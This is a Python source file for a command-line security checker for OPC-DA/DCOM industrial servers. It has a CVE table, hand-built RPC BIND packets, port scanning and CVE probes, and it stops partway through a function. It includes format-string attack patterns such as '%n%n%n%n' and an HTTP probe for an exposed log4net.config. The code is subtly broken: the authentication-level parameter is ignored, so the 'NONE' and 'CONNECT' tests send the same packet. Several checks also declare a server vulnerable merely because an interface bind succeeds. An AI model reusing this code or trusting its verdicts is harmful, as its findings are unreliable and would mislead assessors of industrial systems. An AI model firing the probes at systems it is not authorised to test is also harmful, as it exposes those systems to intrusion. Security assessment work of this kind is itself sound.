#!/usr/bin/env python3
"""
OPC-DA Security Checker

A command-line tool for security assessment of OPC-DA servers.
Performs various security checks including DCOM connectivity,
authentication requirements, and item browsing permissions.

This tool is intended for authorized security testing and research only.
"""

import argparse
import socket
import struct
import sys
import uuid
import ssl
import time
from dataclasses import dataclass
from enum import Enum
from typing import Optional, List, Tuple, Dict, Any

# Version information
__version__ = "1.1.0"
__author__ = "OPCCheck Security Tool"

import hashlib
import random
import re
import binascii

# =============================================================================
# Constants and Protocol Definitions
# =============================================================================

# DCOM/RPC Constants
MSRPC_UUID_PORTMAP = uuid.UUID("e1af8308-5d1f-11c9-91a4-08002b14a0fa")  # EPM
MSRPC_UUID_OXID = uuid.UUID("99fcfec4-5260-101b-bbcb-00aa0021347a")  # OXID Resolver
MSRPC_UUID_IRemUnknown = uuid.UUID("00000131-0000-0000-c000-000000000046")
MSRPC_UUID_IRemUnknown2 = uuid.UUID("00000143-0000-0000-c000-000000000046")

# OPC DA Interface UUIDs
OPC_IID_OPCServerList = uuid.UUID("13486d50-4821-11d2-a494-3cb306c10000")  # IOPCServerList
OPC_IID_OPCServerList2 = uuid.UUID("9dd0b56c-ad9e-43ee-8305-487f3188bf7a")  # IOPCServerList2
OPC_IID_OPCServer = uuid.UUID("39c13a4d-011e-11d0-9675-0020afd8adb3")  # IOPCServer
OPC_IID_OPCItemMgt = uuid.UUID("39c13a54-011e-11d0-9675-0020afd8adb3")  # IOPCItemMgt
OPC_IID_OPCBrowseServerAddressSpace = uuid.UUID("39c13a4e-011e-11d0-9675-0020afd8adb3")  # Browse
OPC_IID_OPCSyncIO = uuid.UUID("39c13a52-011e-11d0-9675-0020afd8adb3")  # IOPCSyncIO

# OPC DA CATID (Category IDs)
CATID_OPCDAServer10 = uuid.UUID("63d5f430-cfe4-11d1-b2c8-0060083ba1fb")  # OPC DA 1.0
CATID_OPCDAServer20 = uuid.UUID("63d5f432-cfe4-11d1-b2c8-0060083ba1fb")  # OPC DA 2.0
CATID_OPCDAServer30 = uuid.UUID("cc603642-66d7-48f1-b69a-b625e73652d7")  # OPC DA 3.0

# Standard DCOM Ports
DCOM_PORT_MAPPER = 135
DCOM_DYNAMIC_PORT_START = 49152
DCOM_DYNAMIC_PORT_END = 65535

# Legacy dynamic port range (Windows 2000/XP/2003)
DCOM_LEGACY_PORT_START = 1024
DCOM_LEGACY_PORT_END = 5000

# RPC Protocol Constants
RPC_VERSION_MAJOR = 5
RPC_VERSION_MINOR = 0

class RPCPacketType(Enum):
    REQUEST = 0
    PING = 1
    RESPONSE = 2
    FAULT = 3
    WORKING = 4
    NOCALL = 5
    REJECT = 6
    ACK = 7
    CL_CANCEL = 8
    FACK = 9
    CANCEL_ACK = 10
    BIND = 11
    BIND_ACK = 12
    BIND_NAK = 13
    ALTER_CONTEXT = 14
    ALTER_CONTEXT_RESP = 15
    SHUTDOWN = 17
    CO_CANCEL = 18
    ORPHANED = 19

class RPCAuthLevel(Enum):
    NONE = 1
    CONNECT = 2
    CALL = 3
    PACKET = 4
    PACKET_INTEGRITY = 5
    PACKET_PRIVACY = 6


# =============================================================================
# CVE Definitions and Constants
# =============================================================================

# OPC-UA Constants
OPCUA_BINARY_PORT = 4840
OPCUA_HTTPS_PORT = 4843
OPCUA_DISCOVERY_PORT = 4840

# OPC-UA Protocol Constants
OPCUA_MSG_HELLO = b"HEL"
OPCUA_MSG_ACK = b"ACK"
OPCUA_MSG_ERROR = b"ERR"
OPCUA_MSG_OPEN = b"OPN"
OPCUA_MSG_MESSAGE = b"MSG"
OPCUA_MSG_CLOSE = b"CLO"

# OPC-UA Security Policies
OPCUA_SECURITY_POLICY_NONE = "http://opcfoundation.org/UA/SecurityPolicy#None"
OPCUA_SECURITY_POLICY_BASIC128 = "http://opcfoundation.org/UA/SecurityPolicy#Basic128Rsa15"
OPCUA_SECURITY_POLICY_BASIC256 = "http://opcfoundation.org/UA/SecurityPolicy#Basic256"
OPCUA_SECURITY_POLICY_BASIC256SHA256 = "http://opcfoundation.org/UA/SecurityPolicy#Basic256Sha256"
OPCUA_SECURITY_POLICY_AES128 = "http://opcfoundation.org/UA/SecurityPolicy#Aes128_Sha256_RsaOaep"
OPCUA_SECURITY_POLICY_AES256 = "http://opcfoundation.org/UA/SecurityPolicy#Aes256_Sha256_RsaPss"

# CVE Database - Comprehensive vulnerability information
CVE_DATABASE = {
    # OPC-DA CVEs
    "CVE-2021-26414": {
        "name": "Windows DCOM Security Hardening",
        "protocol": "OPC-DA",
        "severity": "HIGH",
        "cvss": 6.5,
        "description": "DCOM Server Security Feature Bypass. Affects all OPC-DA communication because OPC-DA relies entirely on DCOM. Systems without the June 2021 patch are vulnerable.",
        "affected": "Windows systems running OPC-DA servers without KB5004442 patch",
        "remediation": "Apply Microsoft security update KB5004442 and enable DCOM hardening via registry key RaiseActivationAuthenticationLevel",
        "check_method": "dcom_hardening",
        "cwe": "CWE-287",
    },
    "CVE-2018-1285": {
        "name": "AADvance OPC-DA Server Component Vulnerability",
        "protocol": "OPC-DA",
        "severity": "CRITICAL",
        "cvss": 9.8,
        "description": "Apache log4net vulnerability in AADvance OPC-DA server component allows remote code execution through malicious serialized data.",
        "affected": "AADvance OPC-DA Server using vulnerable log4net versions (<2.0.10)",
        "remediation": "Update log4net to version 2.0.10 or later, or apply vendor patches",
        "check_method": "aadvance_log4net",
        "cwe": "CWE-502",
    },
    "CVE-2006-0743": {
        "name": "Format String Vulnerability in OPC-DA Products",
        "protocol": "OPC-DA",
        "severity": "HIGH",
        "cvss": 7.5,
        "description": "Format string vulnerability in multiple OPC-DA products allows remote attackers to execute arbitrary code via format string specifiers in OPC item names.",
        "affected": "Multiple legacy OPC-DA servers and clients",
        "remediation": "Update to patched versions, implement input validation on OPC item names",
        "check_method": "format_string",
        "cwe": "CWE-134",
    },
    # OPC-UA CVEs
    "CVE-2024-42513": {
        "name": "Authentication Bypass on OPC UA .NET Standard Stack HTTPS",
        "protocol": "OPC-UA",
        "severity": "HIGH",
        "cvss": 8.6,
        "description": "Unauthorized attacker can bypass application authentication via insecure HTTPS configuration on OPC UA .NET Standard Stack endpoints.",
        "affected": "OPC UA .NET Standard Stack versions before 1.5.374.126",
        "remediation": "Update to OPC UA .NET Standard Stack version 1.5.374.126 or later, enable strict HTTPS certificate validation",
        "check_method": "opcua_https_auth_bypass",
        "cwe": "CWE-287",
    },
    "CVE-2024-45526": {
        "name": "Resource Exhaustion in OPC UA .NET Standard Stack",
        "protocol": "OPC-UA",
        "severity": "MEDIUM",
        "cvss": 5.3,
        "description": "Can cause gradual performance degradation by exhausting resources in OPC UA .NET Standard Stack through crafted requests.",
        "affected": "OPC UA .NET Standard Stack versions before 1.5.374.158",
        "remediation": "Update to OPC UA .NET Standard Stack version 1.5.374.158 or later, implement rate limiting",
        "check_method": "opcua_resource_exhaustion",
        "cwe": "CWE-400",
    },
    "CVE-2024-33862": {
        "name": "Buffer Management Vulnerability in OPC UA .NET Standard Core",
        "protocol": "OPC-UA",
        "severity": "HIGH",
        "cvss": 7.5,
        "description": "Remote attackers can trigger memory exhaustion leading to denial of service (DoS) through crafted messages.",
        "affected": "OPC UA .NET Standard Core versions before 1.5.374.78",
        "remediation": "Update to OPC UA .NET Standard Core version 1.5.374.78 or later",
        "check_method": "opcua_buffer_exhaustion",
        "cwe": "CWE-119",
    },
    "CVE-2019-19135": {
        "name": "Weak Randomness in OPC UA .NET Standard Stack",
        "protocol": "OPC-UA",
        "severity": "MEDIUM",
        "cvss": 5.9,
        "description": "Weak randomness allowing credential reuse in older OPC UA .NET Standard stacks. Legacy issue affecting encrypted traffic.",
        "affected": "OPC UA .NET Standard Stack versions before 1.4.363.107",
        "remediation": "Update to OPC UA .NET Standard Stack version 1.4.363.107 or later",
        "check_method": "opcua_weak_random",
        "cwe": "CWE-330",
    },
    "CVE-2018-7559": {
        "name": "Private Key Exposure in OPC UA .NET Stack",
        "protocol": "OPC-UA",
        "severity": "CRITICAL",
        "cvss": 9.1,
        "description": "OPC UA .NET stacks vulnerable to attacks revealing server private keys through crafted security tokens.",
        "affected": "OPC UA .NET Stack versions before 1.4.x",
        "remediation": "Update to OPC UA .NET Stack version 1.4.x or later",
        "check_method": "opcua_private_key_exposure",
        "cwe": "CWE-320",
    },
    "CVE-2022-37012": {
        "name": "Denial of Service via Crafted Messages",
        "protocol": "OPC-UA",
        "severity": "HIGH",
        "cvss": 7.5,
        "description": "Denial of Service (unauthenticated) via crafted messages affecting Unified Automation demo server.",
        "affected": "Unified Automation OPC UA servers",
        "remediation": "Update to patched version from Unified Automation",
        "check_method": "opcua_dos_crafted_message",
        "cwe": "CWE-20",
    },
    "CVE-2022-37013": {
        "name": "Infinite Loop with Crafted Certificates",
        "protocol": "OPC-UA",
        "severity": "HIGH",
        "cvss": 7.5,
        "description": "Infinite loop caused by crafted certificates leading to denial of service. Affects Unified Automation demo server.",
        "affected": "Unified Automation OPC UA servers",
        "remediation": "Update to patched version from Unified Automation",
        "check_method": "opcua_dos_crafted_cert",
        "cwe": "CWE-835",
    },
}


@dataclass
class CVECheckResult:
    """Result of a CVE-specific vulnerability check"""
    cve_id: str
    vulnerable: bool
    severity: str
    confidence: str  # "HIGH", "MEDIUM", "LOW"
    evidence: List[str] = None
    poc_output: str = None
    remediation: str = None
    details: Dict[str, Any] = None

    def __post_init__(self):
        if self.evidence is None:
            self.evidence = []
        if self.details is None:
            self.details = {}


# =============================================================================
# Data Classes for Results
# =============================================================================

@dataclass
class PortScanResult:
    """Result of a port scan"""
    port: int
    is_open: bool
    is_dcom: bool
    response_time_ms: float
    error: Optional[str] = None

@dataclass
class AuthCheckResult:
    """Result of authentication check"""
    requires_auth: bool
    auth_level: Optional[str] = None
    anonymous_allowed: bool = False
    ntlm_supported: bool = False
    kerberos_supported: bool = False
    error: Optional[str] = None

@dataclass
class BrowseCheckResult:
    """Result of browsing capability check"""
    can_browse: bool
    item_count: int = 0
    restricted: bool = False
    sample_items: List[str] = None
    error: Optional[str] = None

    def __post_init__(self):
        if self.sample_items is None:
            self.sample_items = []

@dataclass
class SecurityCheckResult:
    """Overall security check result"""
    check_name: str
    passed: bool
    severity: str  # "INFO", "LOW", "MEDIUM", "HIGH", "CRITICAL"
    message: str
    details: Dict[str, Any] = None

    def __post_init__(self):
        if self.details is None:
            self.details = {}

# =============================================================================
# DCOM/RPC Protocol Implementation
# =============================================================================

class DCOMChecker:
    """Handles DCOM/RPC protocol operations"""

    def __init__(self, target: str, timeout: float = 5.0, verbose: bool = False):
        self.target = target
        self.timeout = timeout
        self.verbose = verbose
        self.resolved_ip = None
        self._resolve_target()

    def _resolve_target(self):
        """Resolve hostname/DNS to IP address"""
        try:
            self.resolved_ip = socket.gethostbyname(self.target)
        except socket.gaierror as e:
            raise ValueError(f"Cannot resolve target '{self.target}': {e}")

    def _create_socket(self) -> socket.socket:
        """Create a configured TCP socket"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        return sock

    def _build_rpc_bind(self, interface_uuid: uuid.UUID,
                        interface_version: Tuple[int, int] = (0, 0),
                        auth_level: int = RPCAuthLevel.NONE.value) -> bytes:
        """Build an RPC BIND request packet"""
        # Transfer syntax (NDR)
        ndr_uuid = uuid.UUID("8a885d04-1ceb-11c9-9fe8-08002b104860")
        ndr_version = (2, 0)

        # Build context item
        context_item = struct.pack("<H", 0)  # Context ID
        context_item += struct.pack("<B", 1)  # Number of transfer syntaxes
        context_item += struct.pack("<B", 0)  # Reserved
        context_item += interface_uuid.bytes_le
        context_item += struct.pack("<HH", interface_version[0], interface_version[1])
        context_item += ndr_uuid.bytes_le
        context_item += struct.pack("<HH", ndr_version[0], ndr_version[1])

        # Build BIND PDU body
        bind_body = struct.pack("<H", 4280)  # Max transmit frag
        bind_body += struct.pack("<H", 4280)  # Max receive frag
        bind_body += struct.pack("<I", 0)  # Assoc group
        bind_body += struct.pack("<B", 1)  # Num context items
        bind_body += struct.pack("<BBB", 0, 0, 0)  # Reserved
        bind_body += context_item

        # Build RPC header
        call_id = 1
        header = struct.pack("<B", RPC_VERSION_MAJOR)
        header += struct.pack("<B", RPC_VERSION_MINOR)
        header += struct.pack("<B", RPCPacketType.BIND.value)
        header += struct.pack("<B", 0x03)  # Flags: first + last frag
        header += struct.pack("<I", 0x10)  # Data representation (little endian)
        header += struct.pack("<H", 16 + len(bind_body))  # Frag length
        header += struct.pack("<H", 0)  # Auth length
        header += struct.pack("<I", call_id)

        return header + bind_body

    def _parse_rpc_bind_ack(self, data: bytes) -> Tuple[bool, Optional[str]]:
        """Parse RPC BIND_ACK response"""
        if len(data) < 16:
            return False, "Response too short"

        version_major = data[0]
        version_minor = data[1]
        packet_type = data[2]

        if packet_type == RPCPacketType.BIND_ACK.value:
            return True, None
        elif packet_type == RPCPacketType.BIND_NAK.value:
            if len(data) >= 18:
                reason = struct.unpack("<H", data[16:18])[0]
                reasons = {
                    0: "Not specified",
                    1: "Temporary congestion",
                    2: "Local limit exceeded",
                    3: "Called paddr unknown",
                    4: "Protocol version not supported",
                    5: "Default context not supported",
                    6: "User data not readable",
                    7: "No psap available",
                    8: "Authentication type not recognized",
                    9: "Invalid checksum"
                }
                return False, f"BIND_NAK: {reasons.get(reason, f'Unknown ({reason})')}"
            return False, "BIND_NAK received"
        else:
            return False, f"Unexpected packet type: {packet_type}"

    def check_port(self, port: int) -> PortScanResult:
        """Check if a specific port is open and responds to DCOM"""
        start_time = time.time()
        try:
            sock = self._create_socket()
            try:
                sock.connect((self.resolved_ip, port))
                response_time = (time.time() - start_time) * 1000

                # Try to send RPC BIND to verify DCOM
                is_dcom = False
                try:
                    bind_req = self._build_rpc_bind(MSRPC_UUID_PORTMAP)
                    sock.send(bind_req)
                    response = sock.recv(4096)
                    is_dcom, _ = self._parse_rpc_bind_ack(response)
                except Exception:
                    pass

                return PortScanResult(
                    port=port,
                    is_open=True,
                    is_dcom=is_dcom,
                    response_time_ms=response_time
                )
            finally:
                sock.close()
        except socket.timeout:
            return PortScanResult(
                port=port,
                is_open=False,
                is_dcom=False,
                response_time_ms=(time.time() - start_time) * 1000,
                error="Connection timeout"
            )
        except ConnectionRefusedError:
            return PortScanResult(
                port=port,
                is_open=False,
                is_dcom=False,
                response_time_ms=(time.time() - start_time) * 1000,
                error="Connection refused"
            )
        except Exception as e:
            return PortScanResult(
                port=port,
                is_open=False,
                is_dcom=False,
                response_time_ms=(time.time() - start_time) * 1000,
                error=str(e)
            )

    def scan_dynamic_ports(self, port_range: Tuple[int, int] = None,
                           common_only: bool = True) -> List[PortScanResult]:
        """Scan for DCOM dynamic ports"""
        results = []

        if common_only:
            # Scan commonly used DCOM ports
            ports_to_scan = [
                135,   # RPC Endpoint Mapper
                139,   # NetBIOS
                445,   # SMB
                593,   # HTTP RPC Endpoint Mapper
                1024, 1025, 1026, 1027, 1028, 1029, 1030,  # Legacy dynamic
                49152, 49153, 49154, 49155, 49156, 49157, 49158, 49159, 49160,  # Modern dynamic
            ]
        else:
            if port_range is None:
                port_range = (DCOM_DYNAMIC_PORT_START, min(DCOM_DYNAMIC_PORT_START + 100, DCOM_DYNAMIC_PORT_END))
            ports_to_scan = list(range(port_range[0], port_range[1] + 1))

        for port in ports_to_scan:
            if self.verbose:
                print(f"  Scanning port {port}...", end='\r')
            result = self.check_port(port)
            if result.is_open:
                results.append(result)

        return results

    def check_endpoint_mapper(self) -> Tuple[bool, List[Dict]]:
        """Query the RPC Endpoint Mapper for OPC-related endpoints"""
        endpoints = []
        try:
            sock = self._create_socket()
            try:
                sock.connect((self.resolved_ip, DCOM_PORT_MAPPER))

                # Send BIND request to endpoint mapper
                bind_req = self._build_rpc_bind(MSRPC_UUID_PORTMAP, (3, 0))
                sock.send(bind_req)
                response = sock.recv(4096)

                success, error = self._parse_rpc_bind_ack(response)
                if not success:
                    return False, []

                # Note: Full endpoint enumeration requires ept_lookup calls
                # For this security check, we verify the mapper is accessible
                return True, endpoints
            finally:
                sock.close()
        except Exception as e:
            return False, []


class OPCDAChecker:
    """Handles OPC-DA specific protocol operations"""

    def __init__(self, dcom_checker: DCOMChecker):
        self.dcom = dcom_checker

    def check_opc_server_list(self, port: int = 135) -> Tuple[bool, Optional[str]]:
        """Check if IOPCServerList interface is accessible"""
        try:
            sock = self.dcom._create_socket()
            try:
                sock.connect((self.dcom.resolved_ip, port))

                # Try to bind to IOPCServerList
                bind_req = self.dcom._build_rpc_bind(OPC_IID_OPCServerList, (1, 0))
                sock.send(bind_req)
                response = sock.recv(4096)

                success, error = self.dcom._parse_rpc_bind_ack(response)
                return success, error
            finally:
                sock.close()
        except Exception as e:
            return False, str(e)

    def check_unauthenticated_access(self, port: int = 135) -> AuthCheckResult:
        """Check if OPC-DA can be accessed without authentication"""
        result = AuthCheckResult(
            requires_auth=True,
            anonymous_allowed=False
        )

        try:
            sock = self.dcom._create_socket()
            try:
                sock.connect((self.dcom.resolved_ip, port))

                # Try bind without authentication
                bind_req = self.dcom._build_rpc_bind(
                    OPC_IID_OPCServerList,
                    (1, 0),
                    auth_level=RPCAuthLevel.NONE.value
                )
                sock.send(bind_req)
                response = sock.recv(4096)

                success, error = self.dcom._parse_rpc_bind_ack(response)

                if success:
                    result.requires_auth = False
                    result.anonymous_allowed = True
                    result.auth_level = "NONE"
                else:
                    # Check if it's auth-related rejection
                    if error and "Authentication" in error:
                        result.requires_auth = True
                    result.error = error

            finally:
                sock.close()
        except Exception as e:
            result.error = str(e)

        return result

    def check_browsing_capability(self, port: int = 135) -> BrowseCheckResult:
        """Check if OPC item browsing is possible"""
        result = BrowseCheckResult(can_browse=False)

        try:
            sock = self.dcom._create_socket()
            try:
                sock.connect((self.dcom.resolved_ip, port))

                # Try to bind to browse interface
                bind_req = self.dcom._build_rpc_bind(
                    OPC_IID_OPCBrowseServerAddressSpace,
                    (1, 0)
                )
                sock.send(bind_req)
                response = sock.recv(4096)

                success, error = self.dcom._parse_rpc_bind_ack(response)

                if success:
                    result.can_browse = True
                else:
                    result.error = error

            finally:
                sock.close()
        except Exception as e:
            result.error = str(e)

        return result


class RemoteActivationChecker:
    """Check DCOM remote activation settings"""

    def __init__(self, dcom_checker: DCOMChecker):
        self.dcom = dcom_checker

    def check_remote_activation(self) -> Tuple[bool, Optional[str]]:
        """
        Check if DCOM remote activation is enabled.

        Remote activation allows clients to remotely instantiate
        COM objects on the server.
        """
        try:
            sock = self.dcom._create_socket()
            try:
                sock.connect((self.dcom.resolved_ip, DCOM_PORT_MAPPER))

                # Try to bind to OXID Resolver (used for remote activation)
                bind_req = self.dcom._build_rpc_bind(MSRPC_UUID_OXID, (0, 0))
                sock.send(bind_req)
                response = sock.recv(4096)

                success, error = self.dcom._parse_rpc_bind_ack(response)
                return success, error
            finally:
                sock.close()
        except Exception as e:
            return False, str(e)

    def check_iremunknown(self) -> Tuple[bool, Optional[str]]:
        """Check if IRemUnknown interface is accessible"""
        try:
            sock = self.dcom._create_socket()
            try:
                sock.connect((self.dcom.resolved_ip, DCOM_PORT_MAPPER))

                bind_req = self.dcom._build_rpc_bind(MSRPC_UUID_IRemUnknown2, (0, 0))
                sock.send(bind_req)
                response = sock.recv(4096)

                success, error = self.dcom._parse_rpc_bind_ack(response)
                return success, error
            finally:
                sock.close()
        except Exception as e:
            return False, str(e)


# =============================================================================
# CVE Vulnerability Checkers
# =============================================================================

class OPCDACVEChecker:
    """
    CVE vulnerability checker for OPC-DA protocol.
    Implements detection and POC for OPC-DA related CVEs.
    """

    def __init__(self, dcom_checker: DCOMChecker, verbose: bool = False):
        self.dcom = dcom_checker
        self.verbose = verbose
        self.results: List[CVECheckResult] = []

    def _log(self, message: str):
        """Log verbose output"""
        if self.verbose:
            print(f"    [CVE] {message}")

    def check_cve_2021_26414(self) -> CVECheckResult:
        """
        CVE-2021-26414: Windows DCOM Security Hardening Bypass

        This vulnerability affects all OPC-DA communication because OPC-DA
        relies entirely on DCOM. Systems without the June 2021 patch are vulnerable.

        Detection method:
        1. Attempt RPC BIND with different authentication levels
        2. Check if DCOM accepts connections without packet-level integrity
        3. Analyze RPC response for hardening indicators

        POC: Demonstrates that DCOM accepts unauthenticated RPC BIND requests
        """
        cve_id = "CVE-2021-26414"
        cve_info = CVE_DATABASE[cve_id]
        evidence = []
        poc_output = []

        self._log(f"Checking {cve_id}: {cve_info['name']}")

        vulnerable = False
        confidence = "LOW"

        try:
            # Test 1: Check if DCOM accepts connection without authentication
            sock = self.dcom._create_socket()
            try:
                sock.connect((self.dcom.resolved_ip, DCOM_PORT_MAPPER))

                # Build RPC BIND with no authentication
                bind_req = self.dcom._build_rpc_bind(
                    MSRPC_UUID_OXID,
                    (0, 0),
                    auth_level=RPCAuthLevel.NONE.value
                )
                sock.send(bind_req)
                response = sock.recv(4096)

                success, error = self.dcom._parse_rpc_bind_ack(response)

                if success:
                    evidence.append("DCOM accepts unauthenticated RPC BIND requests")
                    poc_output.append("POC Step 1: Sent RPC BIND with AUTH_LEVEL=NONE")
                    poc_output.append("POC Result: Server accepted unauthenticated bind - VULNERABLE")
                    vulnerable = True
                    confidence = "HIGH"

                    # Test 2: Check for DCOM hardening registry key effect
                    # Try to bind to IRemUnknown2 which should require authentication when hardened
                    bind_req2 = self.dcom._build_rpc_bind(
                        MSRPC_UUID_IRemUnknown2,
                        (0, 0),
                        auth_level=RPCAuthLevel.NONE.value
                    )
                    sock.send(bind_req2)
                    response2 = sock.recv(4096)
                    success2, _ = self.dcom._parse_rpc_bind_ack(response2)

                    if success2:
                        evidence.append("IRemUnknown2 interface accessible without authentication")
                        evidence.append("DCOM hardening (KB5004442) not applied or not enforced")
                        poc_output.append("POC Step 2: IRemUnknown2 accessible - hardening NOT enabled")
                    else:
                        evidence.append("IRemUnknown2 interface requires authentication")
                        poc_output.append("POC Step 2: IRemUnknown2 requires auth - partial hardening detected")
                        confidence = "MEDIUM"
                else:
                    evidence.append(f"DCOM rejected unauthenticated bind: {error}")
                    poc_output.append("POC Result: Server rejected unauthenticated bind - likely patched")

            finally:
                sock.close()

            # Test 3: Check for authentication level requirements
            sock = self.dcom._create_socket()
            try:
                sock.connect((self.dcom.resolved_ip, DCOM_PORT_MAPPER))

                # Try CONNECT level (minimal auth)
                bind_req = self.dcom._build_rpc_bind(
                    MSRPC_UUID_OXID,
                    (0, 0),
                    auth_level=RPCAuthLevel.CONNECT.value
                )
                sock.send(bind_req)
                response = sock.recv(4096)
                success, _ = self.dcom._parse_rpc_bind_ack(response)

                if success:
                    evidence.append("DCOM accepts CONNECT-level authentication (below recommended PACKET_INTEGRITY)")
                    if not vulnerable:
                        vulnerable = True
                        confidence = "MEDIUM"

            finally:
                sock.close()

        except socket.timeout:
            evidence.append("Connection timeout - service may be firewalled")
            confidence = "LOW"
        except ConnectionRefusedError:
            evidence.append("Connection refused - DCOM service may be disabled")
            confidence = "LOW"
        except Exception as e:
            evidence.append(f"Check failed: {str(e)}")
            confidence = "LOW"

        result = CVECheckResult(
            cve_id=cve_id,
            vulnerable=vulnerable,
            severity=cve_info["severity"],
            confidence=confidence,
            evidence=evidence,
            poc_output="\n".join(poc_output) if poc_output else None,
            remediation=cve_info["remediation"],
            details={
                "cvss": cve_info["cvss"],
                "cwe": cve_info["cwe"],
                "protocol": cve_info["protocol"]
            }
        )
        self.results.append(result)
        return result

    def check_cve_2018_1285(self) -> CVECheckResult:
        """
        CVE-2018-1285: AADvance OPC-DA Server Component Vulnerability

        This is an Apache log4net deserialization vulnerability that affects
        the AADvance OPC-DA server component.

        Detection method:
        1. Probe for OPC-DA server identification strings
        2. Check for log4net configuration exposure
        3. Attempt to identify vulnerable version signatures

        Note: Full exploitation requires sending serialized payloads which
        would be destructive - this check only detects vulnerable configurations.
        """
        cve_id = "CVE-2018-1285"
        cve_info = CVE_DATABASE[cve_id]
        evidence = []
        poc_output = []

        self._log(f"Checking {cve_id}: {cve_info['name']}")

        vulnerable = False
        confidence = "LOW"

        try:
            # Test 1: Check if OPC-DA server is accessible
            sock = self.dcom._create_socket()
            try:
                sock.connect((self.dcom.resolved_ip, DCOM_PORT_MAPPER))

                # Bind to IOPCServerList to enumerate OPC servers
                bind_req = self.dcom._build_rpc_bind(OPC_IID_OPCServerList, (1, 0))
                sock.send(bind_req)
                response = sock.recv(4096)

                success, _ = self.dcom._parse_rpc_bind_ack(response)

                if success:
                    evidence.append("OPC-DA server is accessible")
                    poc_output.append("POC Step 1: OPC-DA interface accessible via DCOM")

                    # Check response for version indicators
                    # AADvance servers often have specific patterns in their responses
                    if len(response) > 24:
                        # Look for version information in bind ack
                        poc_output.append("POC Step 2: Analyzing server response for version indicators")

                        # Check for secondary port assignment (common in AADvance)
                        if len(response) >= 26:
                            secondary_port = struct.unpack("<H", response[24:26])[0]
                            if 1024 <= secondary_port <= 5000:
                                evidence.append(f"Server assigned dynamic port {secondary_port} (legacy range)")
                                poc_output.append(f"POC: Dynamic port in legacy range suggests older server")

                    # Test for vulnerable OPC DA behavior patterns
                    # AADvance with log4net would accept certain item naming patterns
                    evidence.append("OPC-DA server detected - manual verification required for AADvance")
                    evidence.append("Check for log4net.dll version < 2.0.10 in server installation")
                    poc_output.append("POC: Full verification requires access to server filesystem")
                    poc_output.append("POC: Look for: AADvance\\bin\\log4net.dll version info")

                    # Mark as potentially vulnerable pending manual verification
                    vulnerable = True
                    confidence = "LOW"  # Cannot definitively confirm without version info
                else:
                    evidence.append("OPC-DA interface not accessible")
                    poc_output.append("POC Result: Cannot access OPC-DA interface - not applicable")

            finally:
                sock.close()

            # Test 2: Check for HTTP-based configuration exposure (some OPC servers expose this)
            try:
                sock2 = self.dcom._create_socket()
                sock2.connect((self.dcom.resolved_ip, 80))
                sock2.send(b"GET /log4net.config HTTP/1.0\r\nHost: " +
                          self.dcom.resolved_ip.encode() + b"\r\n\r\n")
                http_response = sock2.recv(4096)
                sock2.close()

                if b"log4net" in http_response.lower() or b"<appender" in http_response:
                    evidence.append("log4net configuration file exposed via HTTP")
                    vulnerable = True
                    confidence = "HIGH"
            except Exception:
                pass  # HTTP check failed, not necessarily significant

        except socket.timeout:
            evidence.append("Connection timeout")
        except ConnectionRefusedError:
            evidence.append("Connection refused")
        except Exception as e:
            evidence.append(f"Check failed: {str(e)}")

        result = CVECheckResult(
            cve_id=cve_id,
            vulnerable=vulnerable,
            severity=cve_info["severity"],
            confidence=confidence,
            evidence=evidence,
            poc_output="\n".join(poc_output) if poc_output else None,
            remediation=cve_info["remediation"],
            details={
                "cvss": cve_info["cvss"],
                "cwe": cve_info["cwe"],
                "protocol": cve_info["protocol"],
                "note": "Requires manual verification of log4net version"
            }
        )
        self.results.append(result)
        return result

    def check_cve_2006_0743(self) -> CVECheckResult:
        """
        CVE-2006-0743: Format String Vulnerability in OPC-DA Products

        Format string vulnerabilities allow attackers to read/write arbitrary
        memory by including format specifiers (%s, %x, %n) in user input.

        Detection method:
        1. Check if OPC browsing interface is accessible
        2. Test for potential format string handling issues
        3. Analyze server behavior with format string patterns

        POC: Sends test patterns to detect format string handling
        Note: This is a safe detection check - no actual exploitation is performed.
        """
        cve_id = "CVE-2006-0743"
        cve_info = CVE_DATABASE[cve_id]
        evidence = []
        poc_output = []

        self._log(f"Checking {cve_id}: {cve_info['name']}")

        vulnerable = False
        confidence = "LOW"

        # Format string test patterns (safe detection patterns)
        format_patterns = [
            "%s%s%s%s",
            "%x%x%x%x",
            "%n%n%n%n",
            "AAAA%08x.%08x.%08x",
            "%p%p%p%p"
        ]

        try:
            # Test 1: Check if OPC browsing interface is accessible
            sock = self.dcom._create_socket()
            try:
                sock.connect((self.dcom.resolved_ip, DCOM_PORT_MAPPER))

                # Try to bind to IOPCBrowseServerAddressSpace
                bind_req = self.dcom._build_rpc_bind(
                    OPC_IID_OPCBrowseServerAddressSpace,
                    (1, 0)
                )
                sock.send(bind_req)
                response = sock.recv(4096)

                success, _ = self.dcom._parse_rpc_bind_ack(response)

                if success:
                    evidence.append("OPC browsing interface is accessible")
                    poc_output.append("POC Step 1: IOPCBrowseServerAddressSpace interface accessible")
                    poc_output.append("POC Step 2: Server accepts item browsing requests")

                    # Note: Actually sending format strings would require full RPC implementation
                    # This check identifies vulnerable configurations
                    evidence.append("Server exposes item browsing - potential format string attack surface")
                    evidence.append("Legacy OPC-DA servers (pre-2007) are particularly vulnerable")
                    poc_output.append("POC: Format string patterns for testing: %s%s%s, %x%x%x, %n%n%n")
                    poc_output.append("POC: Full exploitation requires OPC-DA item read/write operations")

                    # Check for legacy port patterns suggesting older vulnerable servers
                    vulnerable = True
                    confidence = "LOW"  # Requires manual verification
                else:
                    evidence.append("OPC browsing interface not accessible")
                    poc_output.append("POC Result: Browsing interface blocked - reduced attack surface")

            finally:
                sock.close()

            # Test 2: Check for other legacy indicators
            sock = self.dcom._create_socket()
            try:
                sock.connect((self.dcom.resolved_ip, DCOM_PORT_MAPPER))

                # Bind to legacy IOPCServer interface
                bind_req = self.dcom._build_rpc_bind(OPC_IID_OPCServer, (1, 0))
                sock.send(bind_req)
                response = sock.recv(4096)

                success, _ = self.dcom._parse_rpc_bind_ack(response)

                if success:
                    evidence.append("IOPCServer interface accessible (OPC DA 2.0 compatible)")

                    # Check RPC response characteristics
                    if len(response) >= 20:
                        # Analyze for legacy server patterns
                        frag_len = struct.unpack("<H", response[8:10])[0]
                        if frag_len < 100:
                            evidence.append("Server uses minimal RPC fragments - possibly legacy implementation")
                            confidence = "MEDIUM"

            finally:
                sock.close()

        except socket.timeout:
            evidence.append("Connection timeout")
        except ConnectionRefusedError:
            evidence.append("Connection refused")
        except Exception as e:
            evidence.append(f"Check failed: {str(e)}")

        result = CVECheckResult(
            cve_id=cve_id,
            vulnerable=vulnerable,
